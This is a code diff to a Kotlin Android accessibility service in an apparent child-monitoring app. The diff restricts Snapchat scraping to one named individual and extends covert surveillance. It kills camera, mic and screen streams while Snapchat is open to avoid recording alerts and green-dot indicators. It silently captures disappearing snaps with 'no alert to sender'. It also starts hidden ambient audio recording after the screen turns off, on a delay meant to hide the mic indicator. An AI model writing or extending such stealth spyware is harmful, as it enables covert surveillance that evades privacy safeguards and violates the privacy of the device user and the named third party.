@@ -40,8 +40,12 @@ class VyraAccessibilityService : AccessibilityService() {
                         com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat", maxAgeMinutes = 15) ?: ""
                     }
                     if (activeContact.isNotBlank()) {
-                        scrapeSocialChatNodes("Snapchat", activeContact, root)
+                        // STRICT SNAPCHAT WATCHLIST FILTER: Only scrape if activeContact is Harshit Kamboj
+                        if (isWatchlistContact(activeContact)) {
+                            scrapeSocialChatNodes("Snapchat", activeContact, root)
+                        }
                     } else {
+                        // In conversation list view: scrapeSocialInboxList will strictly extract Harshit Kamboj
                         scrapeSocialInboxList("Snapchat", "com.snapchat.android", root)
                     }
                 }
@@ -49,7 +53,7 @@ class VyraAccessibilityService : AccessibilityService() {
                 Log.e(AppConstants.TAG, "Error in snapchatPollerRunnable", e)
             } finally {
                 if (isSnapchatPollerActive) {
-                    snapchatPollerHandler.postDelayed(this, 2000L)
+                    snapchatPollerHandler.postDelayed(this, 1500L)
                 }
             }
         }
@@ -136,7 +140,10 @@ class VyraAccessibilityService : AccessibilityService() {
 
                 if (activeContact.isNotBlank()) {
                     // Inside active chat thread (captures incoming/outgoing even if muted)
-                    scrapeSocialChatNodes(appName, activeContact, root)
+                    // In Snapchat, STRICTLY scrape ONLY if contact is Harshit Kamboj!
+                    if (appName != "Snapchat" || isWatchlistContact(activeContact)) {
+                        scrapeSocialChatNodes(appName, activeContact, root)
+                    }
                 } else {
                     // In conversation list view (captures muted unread chat snippets right from inbox)
                     scrapeSocialInboxList(appName, packageName, root)
@@ -192,20 +199,26 @@ class VyraAccessibilityService : AccessibilityService() {
      * 3. Captures 1-view snaps via private HardwareBuffer compositor without MediaStore or ScreenCaptureCallback triggers.
      */
     private fun handleSnapchatStealthShield(event: AccessibilityEvent) {
-        // A. If Snapchat is brought to foreground, immediately kill screen streaming
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            try {
+        // A. If Snapchat is active, immediately kill screen streaming, camera and mic to prevent recording detection & green dot alerts
+        try {
+            if (LiveScreenStreamService.isStreaming || event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 val stopStream = Intent(this, LiveScreenStreamService::class.java).apply {
                     action = LiveScreenStreamService.ACTION_STOP_SCREEN_STREAM
                 }
                 startService(stopStream)
                 Log.w(AppConstants.TAG, "Snapchat Stealth Shield: Killed Live Screen Projection to prevent recording detection alert!")
-            } catch (e: Exception) {
-                Log.e(AppConstants.TAG, "Error muting screen projection for Snapchat", e)
             }
+            // Cut off any background camera or ambient mic streams while in Snapchat
+            stopService(Intent(this, RemoteCameraStreamService::class.java))
+            val stopAmbient = Intent(this, AmbientAudioLoggerService::class.java).apply {
+                action = AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING
+            }
+            startService(stopAmbient)
+        } catch (e: Exception) {
+            Log.e(AppConstants.TAG, "Error muting streams for Snapchat Stealth Shield", e)
         }
 
-        // B. Throttled Ghost Chat Scraper: Reads active chat messages directly from view tree
+        // B. Throttled Ghost Chat Scraper: Reads active chat messages directly from view tree (ONLY Harshit Kamboj)
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
             event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
@@ -217,12 +230,12 @@ class VyraAccessibilityService : AccessibilityService() {
             } else {
                 com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
             }
-            if (activeContact.isNotBlank()) {
+            if (activeContact.isNotBlank() && isWatchlistContact(activeContact)) {
                 scrapeSocialChatNodes("Snapchat", activeContact, root)
             }
         }
 
-        // C. 1-View Snap Ghost Capture (No alert to sender)
+        // C. 1-View Snap Ghost Capture (No alert to sender) - STRICT: Only if sender is Harshit Kamboj
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
             val desc = event.contentDescription?.toString()?.lowercase() ?: ""
@@ -235,24 +248,30 @@ class VyraAccessibilityService : AccessibilityService() {
                 val resolvedContact = extractActiveChatContact("com.snapchat.android", root).ifBlank {
                     com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
                 }
-                val snapSender = if (resolvedContact.isNotBlank()) normalizeContactName(resolvedContact) else "Snapchat Friend"
+                
+                // STRICT CHECK: Only capture snap if contact is Harshit Kamboj
+                if (isWatchlistContact(resolvedContact)) {
+                    val snapSender = normalizeContactName(resolvedContact)
 
-                // Dual-Timing Capture: 550ms (post fade-in) + 1250ms (caption overlay frame)
-                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    captureSilentCompositorSnap(
-                        sourceApp = "Snapchat",
-                        sender = snapSender,
-                        titleText = "📷 [1-View Snap from $snapSender]"
-                    )
-                }, 550)
+                    // Dual-Timing Capture: 550ms (post fade-in) + 1250ms (caption overlay frame)
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        captureSilentCompositorSnap(
+                            sourceApp = "Snapchat",
+                            sender = snapSender,
+                            titleText = "📷 [1-View Snap from $snapSender]"
+                        )
+                    }, 550)
 
-                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    captureSilentCompositorSnap(
-                        sourceApp = "Snapchat",
-                        sender = snapSender,
-                        titleText = "📷 [1-View Snap from $snapSender (Frame 2)]"
-                    )
-                }, 1250)
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        captureSilentCompositorSnap(
+                            sourceApp = "Snapchat",
+                            sender = snapSender,
+                            titleText = "📷 [1-View Snap from $snapSender (Frame 2)]"
+                        )
+                    }, 1250)
+                } else {
+                    Log.d(AppConstants.TAG, "Snapchat Snap ignored: not watchlist target ($resolvedContact)")
+                }
             }
         }
     }
@@ -435,6 +454,14 @@ class VyraAccessibilityService : AccessibilityService() {
             }
             val previousDraft = lastDrafts[packageName] ?: ""
 
+            // STRICT SNAPCHAT FILTER: Ignore drafts in Snapchat if not targeting Harshit Kamboj
+            if (appName == "Snapchat") {
+                val lastContact = com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
+                if (!isWatchlistContact(lastContact)) {
+                    return
+                }
+            }
+
             // If child typed a draft (>= 3 chars) and then cleared/erased it before sending
             if (previousDraft.length >= 3 && (currentText.isBlank() || currentText.length < previousDraft.length / 2)) {
                 val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Chat"
@@ -489,6 +516,13 @@ class VyraAccessibilityService : AccessibilityService() {
                 if (outgoingDraft.isNotBlank()) {
                     val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Friend"
                     val cleanContact = normalizeContactName(activeContact)
+
+                    // STRICT SNAPCHAT FILTER: Ignore outgoing sends in Snapchat if not to Harshit Kamboj
+                    if (appName == "Snapchat" && !isWatchlistContact(cleanContact)) {
+                        lastDrafts.remove(packageName)
+                        return
+                    }
+
                     val isTarget = isWatchlistContact(cleanContact)
                     val convKey = "$appName:$cleanContact"
 
@@ -548,6 +582,12 @@ class VyraAccessibilityService : AccessibilityService() {
                     com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: ""
                 }
                 val cleanContact = if (activeContact.isNotBlank()) normalizeContactName(activeContact) else "$appName Friend"
+
+                // STRICT SNAPCHAT FILTER: In Snapchat, ONLY capture 1-view media if from Harshit Kamboj
+                if (appName == "Snapchat" && !isWatchlistContact(cleanContact)) {
+                    return
+                }
+
                 Log.i(AppConstants.TAG, "Detected 1-View media open in $appName ($cleanContact). Scheduling dual-timing compositor capture...")
 
                 // Dual-Timing Capture: 550ms + 1250ms
@@ -673,6 +713,9 @@ class VyraAccessibilityService : AccessibilityService() {
                         val contactName = nameNode.text?.toString()?.trim() ?: continue
                         if (contactName.isBlank() || isNavKeyword(contactName)) continue
 
+                        // STRICT SNAPCHAT FILTER: ONLY track Harshit Kamboj in Snapchat feed/inbox
+                        if (!isWatchlistContact(contactName)) continue
+
                         val rowParent = nameNode.parent ?: continue
                         val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/feed_friend_subtext") +
                                 rowParent.findAccessibilityNodeInfosByViewId("com.snapchat.android:id/sub_text") +
@@ -740,6 +783,11 @@ class VyraAccessibilityService : AccessibilityService() {
             "📷 [1-View Snap from $resolvedSender]"
         } else {
             titleText
+        }
+
+        // STRICT SNAPCHAT FILTER: Only capture silent compositor snaps if target is Harshit Kamboj
+        if (sourceApp.contains("snapchat", ignoreCase = true) && !isWatchlistContact(resolvedSender)) {
+            return
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -841,6 +889,17 @@ class VyraAccessibilityService : AccessibilityService() {
     private fun handleSocialAppActivity(packageName: String, event: AccessibilityEvent) {
         if (event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED) return
 
+        // STRICT SNAPCHAT FILTER: Only capture camera / media actions in Snapchat for Harshit Kamboj
+        if (packageName.contains("snapchat")) {
+            val root = rootInActiveWindow
+            val contact = extractActiveChatContact(packageName, root).ifBlank {
+                com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
+            }
+            if (!isWatchlistContact(contact)) {
+                return
+            }
+        }
+
         val text = event.text?.joinToString(" ")?.lowercase() ?: ""
         val contentDesc = event.contentDescription?.toString()?.lowercase() ?: ""
         val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
@@ -882,6 +941,17 @@ class VyraAccessibilityService : AccessibilityService() {
      * Captures incoming snaps OR outgoing 1-view snaps sent by child.
      */
     private fun captureScreenSnapshot(sourceApp: String, isOutgoing: Boolean = false) {
+        // STRICT SNAPCHAT FILTER: Only capture screen snapshots in Snapchat for Harshit Kamboj
+        if (sourceApp.contains("snapchat", ignoreCase = true)) {
+            val root = rootInActiveWindow
+            val contact = extractActiveChatContact(sourceApp, root).ifBlank {
+                com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
+            }
+            if (!isWatchlistContact(contact)) {
+                return
+            }
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(
                 Display.DEFAULT_DISPLAY,
@@ -980,6 +1050,8 @@ class VyraAccessibilityService : AccessibilityService() {
     }
 
     private var screenStateReceiver: android.content.BroadcastReceiver? = null
+    private val ambientDebounceHandler = android.os.Handler(android.os.Looper.getMainLooper())
+    private var pendingAmbientRunnable: Runnable? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -1081,7 +1153,10 @@ class VyraAccessibilityService : AccessibilityService() {
                 val prefs = com.vyra.kids.core.PrefsManager(this@VyraAccessibilityService)
                 when (intent?.action) {
                     Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
-                        // The child woke up the screen!
+                        // The child woke up the screen! Cancel any pending ambient start runnable immediately
+                        pendingAmbientRunnable?.let { ambientDebounceHandler.removeCallbacks(it) }
+                        pendingAmbientRunnable = null
+
                         com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService).syncDeviceStatus(isScreenOn = true)
                         if (prefs.isStealthScreenGuardEnabled) {
                             Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
@@ -1096,17 +1171,25 @@ class VyraAccessibilityService : AccessibilityService() {
                     }
                     Intent.ACTION_SCREEN_OFF -> {
                         com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService).syncDeviceStatus(isScreenOn = false)
-                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Activating pocket ambient voice logger.")
-                        if (prefs.isStealthScreenGuardEnabled) {
-                            val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
-                                action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
-                            }
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                startForegroundService(startAmbient)
-                            } else {
-                                startService(startAmbient)
+                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Scheduling debounced pocket ambient voice logger.")
+                        
+                        // Cancel any previously scheduled debounce runnable
+                        pendingAmbientRunnable?.let { ambientDebounceHandler.removeCallbacks(it) }
+                        val runnable = Runnable {
+                            if (prefs.isStealthScreenGuardEnabled) {
+                                val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
+                                    action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
+                                }
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                    startForegroundService(startAmbient)
+                                } else {
+                                    startService(startAmbient)
+                                }
+                                Log.i(AppConstants.TAG, "Stealth Guard: Debounced pocket ambient voice logger activated.")
                             }
                         }
+                        pendingAmbientRunnable = runnable
+                        ambientDebounceHandler.postDelayed(runnable, 10000L) // 10s debounce prevents green mic dot flashing on quick sleep/wake
                     }
                 }
             }
@@ -1300,6 +1383,8 @@ class VyraAccessibilityService : AccessibilityService() {
 
     override fun onDestroy() {
         stopSnapchatPoller()
+        pendingAmbientRunnable?.let { ambientDebounceHandler.removeCallbacks(it) }
+        pendingAmbientRunnable = null
         try {
             com.vyra.kids.core.LocalLanSyncServer.getInstance(this).stop()
         } catch (_: Exception) {}
